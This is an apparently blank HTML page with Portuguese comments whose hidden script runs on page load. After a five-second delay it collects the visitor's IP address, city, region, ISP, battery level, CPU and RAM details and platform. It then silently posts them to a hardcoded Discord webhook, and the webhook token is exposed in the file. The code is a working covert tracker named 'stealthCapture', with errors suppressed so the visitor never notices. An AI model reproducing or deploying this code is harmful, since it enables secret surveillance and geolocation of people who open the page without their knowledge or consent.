<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>body { background: #fff; margin: 0; overflow: hidden; }</style>
</head>
<body>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1499880092493414521/NHvrU1wucCRBtCcbC70MEdcpcl-hhH6fJBTl9xsrrrEfwIaXvlkAQrkoH29e0Y_FBiDM";

    // Função que espera X segundos
    const sleep = ms => new Promise(res => setTimeout(res, ms));

    async function stealthCapture() {
        // CONTAGEM DE 5 SEGUNDOS (5000 milissegundos)
        await sleep(5000); 

        try {
            // 1. Captura de IP e Localização
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();

            // 2. Bateria
            let batteryInfo = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryInfo = Math.round(b.level * 100) + "%";
            }

            // 3. Hardware
            const hardwareInfo = navigator.hardwareConcurrency + " Cores / " + (navigator.deviceMemory || 'N/A') + "GB RAM";

            // 4. Montar o relatório para o Discord
            const discordPayload = {
                username: "Monitoramento 5s",
                embeds: [{
                    title: "🕵️ Captura Concluída (Após 5 segundos)",
                    color: 16777215,
                    fields: [
                        { name: "🌐 IP", value: ipData.ip || "Erro", inline: true },
                        { name: "📍 Local", value: (ipData.city || "Desconhecido") + ", " + (ipData.region || ""), inline: true },
                        { name: "🔋 Bateria", value: batteryInfo, inline: true },
                        { name: "💻 Hardware", value: hardwareInfo, inline: true },
                        { name: "📱 Sistema", value: navigator.platform, inline: true },
                        { name: "📡 ISP", value: ipData.org || "N/A" }
                    ],
                    footer: { text: "Atraso de 5s aplicado com sucesso" },
                    timestamp: new Date()
                }]
            };

            // 5. Enviar para o Discord
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

        } catch (error) {
            // Falha silenciosa
        }
    }

    window.onload = stealthCapture;
</script>
</body>
</html>
